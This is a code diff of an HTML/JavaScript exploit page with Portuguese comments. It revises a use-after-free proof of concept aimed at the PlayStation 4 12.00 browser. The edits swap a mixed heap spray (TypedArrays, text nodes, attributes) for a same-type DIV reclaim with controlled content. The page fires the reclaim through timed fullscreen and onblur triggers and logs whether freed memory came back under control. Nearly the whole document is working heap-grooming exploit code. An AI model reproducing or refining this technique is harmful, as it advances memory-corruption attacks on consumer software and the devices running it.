@@ -2,17 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Targeted Reclaim (Safe Log)</title>
+<title>PS4 12.00 - UAF Monotype Reclaim</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Targeted Reclaim (Safe Log)</h2>
+<h2>PS4 12.00 - UAF Monotype Reclaim (DIV Control)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 LOG SEGURO (CRÍTICO)
+// 🔒 LOG SEGURO
 // ==========================
 let logBuffer = [];
 
@@ -63,25 +63,27 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 TARGETED RECLAIM
+// 💣 MONOTYPE RECLAIM (DIV ONLY)
 // ==========================
-function targetedReclaim() {
-    log("[*] Targeted reclaim iniciado");
+function monotypeReclaim() {
+    log("[*] Monotype reclaim iniciado");
 
     let bucket = [];
 
-    // 🔥 Fase 1 — churn pesado
-    for (let i = 0; i < 8000; i++) {
+    // 🔥 Fase 1 — churn leve (fragmentação controlada)
+    for (let i = 0; i < 6000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // 🔥 Fase 2 — REUSE DIRECIONADO (CRÍTICO)
-    for (let i = 0; i < 12000; i++) {
+    // 🔥 Fase 2 — REUSE DIRECIONADO (MESMO TIPO + MESMA ESTRUTURA)
+    for (let i = 0; i < 15000; i++) {
         let el = document.createElement("div");
 
-        el.innerHTML = "REUSE_EL_" + i;
+        // 🔑 mesma estrutura do alvo
+        el.innerHTML = "<h1>CONTROL_" + i + "</h1>";
+
         el.style.position = "absolute";
         el.style.width = "100%";
         el.style.height = "100%";
@@ -90,35 +92,19 @@ function targetedReclaim() {
         bucket.push(el);
     }
 
-    // 🔥 Fase 3 — TypedArray spray (controle heap)
-    for (let i = 0; i < 10000; i++) {
-        let buf = new ArrayBuffer(0x100);
-        let view = new Uint32Array(buf);
-        view[0] = 0x41414141;
-        bucket.push(view);
-    }
-
-    // 🔥 Fase 4 — TextNode
-    for (let i = 0; i < 10000; i++) {
-        let txt = document.createTextNode("TXT_" + i);
-        document.body.appendChild(txt);
-        bucket.push(txt);
-    }
-
-    // 🔥 Fase 5 — Attribute spray
-    for (let i = 0; i < 10000; i++) {
+    // 🔥 Fase 3 — churn final leve
+    for (let i = 0; i < 4000; i++) {
         let el = document.createElement("div");
-        el.setAttribute("data-x", "ATTR_" + i);
         document.body.appendChild(el);
-        bucket.push(el);
+        el.remove();
     }
 
-    log("[*] Targeted reclaim finalizado: " + bucket.length);
+    log("[*] Monotype reclaim finalizado: " + bucket.length);
     return bucket;
 }
 
 // ==========================
-// 🔬 DETECÇÃO DE CORRUPÇÃO REAL
+// 🔬 DETECÇÃO DE CONTROLE REAL
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
@@ -127,8 +113,8 @@ function checkUAF(fsTarget) {
         let html = fsTarget.innerHTML;
         log("[CHECK] innerHTML = " + html);
 
-        if (html && html.includes("REUSE_EL_")) {
-            log("[!!!] UAF DETECTADO (REUSE OVERWRITE)");
+        if (html && html.includes("CONTROL_")) {
+            log("[!!!] UAF CONTROLADO (DIV REUSE)");
         }
 
     } catch(e) {
@@ -136,24 +122,8 @@ function checkUAF(fsTarget) {
     }
 
     try {
-        let attr = fsTarget.getAttribute("data-x");
-        log("[CHECK] data-x = " + attr);
-
-        if (attr && attr.includes("ATTR_")) {
-            log("[!!!] UAF DETECTADO (ATTR OVERWRITE)");
-        }
-
-    } catch(e) {
-        log("[UAF] attribute erro");
-    }
-
-    try {
         let node = fsTarget.firstChild;
         log("[CHECK] firstChild = " + node);
-
-        if (node && node.textContent && node.textContent.includes("TXT_")) {
-            log("[!!!] UAF DETECTADO (TEXTNODE OVERWRITE)");
-        }
 
     } catch(e) {
         log("[UAF] firstChild erro");
@@ -177,24 +147,24 @@ function trigger(fsTarget) {
         log("[ERRO]");
     }
 
-    // 🔥 janela crítica — múltiplos reclaims
-    setTimeout(() => targetedReclaim(), 0);
-    setTimeout(() => targetedReclaim(), 50);
-    setTimeout(() => targetedReclaim(), 100);
+    // 🔥 janela crítica — mesmo padrão agressivo
+    setTimeout(() => monotypeReclaim(), 0);
+    setTimeout(() => monotypeReclaim(), 50);
+    setTimeout(() => monotypeReclaim(), 100);
 
-    // 🔬 checks progressivos
+    // 🔬 checks
     setTimeout(() => checkUAF(fsTarget), 10);
     setTimeout(() => checkUAF(fsTarget), 30);
     setTimeout(() => checkUAF(fsTarget), 60);
     setTimeout(() => checkUAF(fsTarget), 120);
     setTimeout(() => checkUAF(fsTarget), 250);
 
-    // 🔒 dump seguro (CRÍTICO)
+    // 🔒 dump seguro
     setTimeout(() => {
         alert(logBuffer.join("\n"));
     }, 400);
 
-    // 🔁 comportamento original
+    // 🔁 comportamento original preservado
     setTimeout(() => location.reload(), 500);
 }
 
@@ -210,7 +180,7 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur");
 
-        // ⚠️ timing crítico preservado
+        // ⚠️ timing crítico intacto
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
